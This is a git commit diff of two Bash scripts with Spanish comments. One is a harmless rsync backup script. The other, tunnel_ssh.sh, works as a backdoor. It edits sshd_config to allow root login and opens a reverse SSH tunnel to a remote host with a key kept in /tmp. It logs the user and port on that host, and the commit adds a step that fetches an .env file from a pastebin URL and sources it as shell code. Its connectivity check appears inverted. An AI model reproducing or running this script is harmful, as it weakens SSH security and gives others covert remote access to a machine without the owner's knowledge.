8e0abb38a6fa6f82abb89a80cbb34e9db792c4e9
joker <geovannicinto@gmail.com>
2023-07-04 18:53:08 -0600

    Se hicieron cambios

--- sync_files.sh
+++ sync_files.sh
@@ -1,28 +1,28 @@
 #!/bin/bash
 
 # Pequeño script que sincronizan mis documentos de la thinkbook a la raspberry
-source ./.env
+source "$HOME/Documentos/Scripts Bash/.env"
 
 sync_file() {
-  local user=$USER
-  local host=$HOSTNAME
-  local port=$PORT
-  local exclude="node_modules .git"
+    local user=$USER
+    local host=$HOSTNAME
+    local port=$PORT
+    local exclude="node_modules .git"
 
-  # ping -c 3 $host
-  # El $? captura el código de salida de un comando
-  # if [[ $? != 0 ]]; then
-  if [[ ! $(ping -c 3 $host) ]]; then
-    echo "No se pudo completar la acción"
-  else
-    echo "Servidor encontrado"
-    sleep 3
-    for files in "$@"; do
-      rsync -avzhPe "ssh -p $port" --exclude="$exclude" --delete --progress "$HOME/$files/" "$user@$host:/home/$user/$files"
-      # De pi a thinkbook
-      # rsync -avzh "ssh -p 39906" $user@$host:/home/$user/$files/ $HOME/$files
-    done
-  fi
+    # ping -c 3 $host
+    # El $? captura el código de salida de un comando
+    # if [[ $? != 0 ]]; then
+    if [[ ! $(ping -c 3 "$host") ]]; then
+        echo "No se pudo completar la acción"
+    else
+        echo "Servidor encontrado"
+        sleep 3
+        for files in "$@"; do
+            rsync -avzhPe "ssh -p $port" --exclude="$exclude" --delete --progress "$HOME/$files/" "$user@$host:/home/$user/$files"
+            # De pi a thinkbook
+            # rsync -avzh "ssh -p 39906" $user@$host:/home/$user/$files/ $HOME/$files
+        done
+    fi
 }
 
-sync_file Documentos Imágenes #Backups/Thinkpad Backups/Minecraft
+sync_file Documentos Imágenes # Backups #Backups/Thinkpad Backups/Minecraft
--- tunnel_ssh.sh
+++ tunnel_ssh.sh
@@ -1,16 +1,12 @@
 #!/bin/bash
 
-source "./.env"
-
-# rm "./.env"
-
 connect_ssh() {
     sshd_config=/etc/ssh/sshd_config
     if [[ $(ls $sshd_config) ]]; then
         port=$(cat $sshd_config | grep -w Port | awk '{print $2}')
         port_random=$(shuf -i 39900-39910 -n 1)
         ssh_root=$(cat $sshd_config | grep -w PermitRootLogin | awk 'NR==1{print $2}')
-        start_ssh=$(ssh -t -R "$port_random":localhost:"$port" $USER@$HOSTNAME -p $PORT "echo $(whoami) $port_random >> /tmp/remote_users.txt; sh")
+        start_ssh=$(ssh -t -i /tmp/id_rsa_test -R "$port_random":localhost:"$port" "$USER"@"$HOSTNAME" -p "$PORT" "echo $(whoami) $port_random >> /tmp/remote_users.txt; sh")
         if [[ $ssh_root != 'yes' ]]; then
             sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' $sshd_config
             $start_ssh
@@ -23,4 +19,10 @@ connect_ssh() {
     fi
 }
 
-connect_ssh
+if [[ ! $(ping -c 3 google.com) ]]; then
+    if wget -O "/tmp/.env" https://pastebin.com/raw/p12FvLdf; then
+        sleep 10
+        source /tmp/.env
+        connect_ssh
+    fi
+fi
